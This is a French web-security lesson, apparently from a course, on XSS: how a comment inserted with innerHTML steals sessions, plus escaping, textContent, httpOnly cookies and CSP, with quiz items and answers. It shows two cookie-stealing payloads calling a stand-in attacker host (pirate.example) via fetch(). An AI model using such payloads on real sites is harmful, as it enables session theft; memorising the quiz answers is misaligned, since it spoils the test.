---
id: securite-02
title: "XSS : quand le texte d'un utilisateur devient du code"
minutes: 12
summary: Comment un commentaire peut voler les sessions de tous les visiteurs, et comment l'échappement l'en empêche.
check:
  - prompt: "Un commentaire contient `<img src=x onerror=\"fetch('https://pirate.ex/?c='+document.cookie)\">`. Le site l'insère avec innerHTML. Que se passe-t-il ?"
    choices:
      - Rien, ce n'est qu'une image cassée
      - "Le code s'exécute chez chaque visiteur de la page, avec ses droits"
    answer: 1
  - prompt: Dans quel ordre échapper les caractères spéciaux HTML ?
    choices:
      - "Le & en premier, sinon les & des entités déjà produites (&lt;) seraient échappés une seconde fois"
      - L'ordre n'a pas d'importance
    answer: 0
  - prompt: "Quelle propriété du DOM insère du texte sans jamais l'interpréter comme du HTML ?"
    choices:
      - "`innerHTML`"
      - "`textContent`"
    answer: 1
---

## L'attaque

Un site affiche les commentaires de ses utilisateurs :

```js
zone.innerHTML += `<p class="commentaire">${commentaire.texte}</p>`;
```

Un utilisateur poste ce « commentaire » :

```html
<img src="x" onerror="fetch('https://pirate.example/vol?c=' + document.cookie)">
```

L'image ne charge pas, `onerror` s'exécute, et le cookie de session de **chaque visiteur**
part chez l'attaquant. C'est une faille **XSS** (*Cross-Site Scripting*) : le texte d'un
utilisateur est devenu du **code** exécuté par le navigateur des autres.

## La règle : échapper à la sortie

Le texte doit rester du texte. Pour cela, on remplace les caractères qui ont un sens en HTML
par des **entités** :

| Caractère | Entité | Pourquoi |
|---|---|---|
| `&` | `&amp;` | début d'une entité : à traiter **en premier** |
| `<` | `&lt;` | ouvre une balise |
| `>` | `&gt;` | ferme une balise |
| `"` | `&quot;` | ferme un attribut entre guillemets |
| `'` | `&#39;` | ferme un attribut entre apostrophes |

```js run
function echapperHTML(texte) {
  return String(texte)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

console.log(echapperHTML('<img src=x onerror="alert(1)">'));
console.log(echapperHTML("Tom & Jerry"));
```

> **Attention** : si `&` est remplacé **après** `<`, alors `<` devient `&lt;`, puis
> `&amp;lt;`, et l'utilisateur voit s'afficher « &lt; » au lieu de « < ».

## Les bonnes pratiques

- **Échapper au moment de l'affichage**, pas à l'enregistrement : la base garde le texte
  d'origine, chaque sortie (HTML, JSON, e-mail) a ses propres règles.
- Dans le navigateur, préférer `textContent` à `innerHTML` : il n'interprète jamais le HTML.
- React, Vue et les moteurs de gabarits échappent **par défaut**. La faille revient dès qu'on
  contourne cette protection (`dangerouslySetInnerHTML` en React, `v-html` en Vue).
- Les **cookies `httpOnly`** ne sont pas lisibles par JavaScript : même en cas de XSS,
  `document.cookie` ne les révèle pas.
- Une **Content-Security-Policy** (en-tête HTTP) peut interdire les scripts non prévus.

## Ce que tu sais faire maintenant

- Expliquer comment une faille XSS vole les sessions des visiteurs.
- Échapper du texte pour le HTML, dans le bon ordre.
- Choisir `textContent` plutôt que `innerHTML`.
- Citer les protections complémentaires : `httpOnly` et Content-Security-Policy.
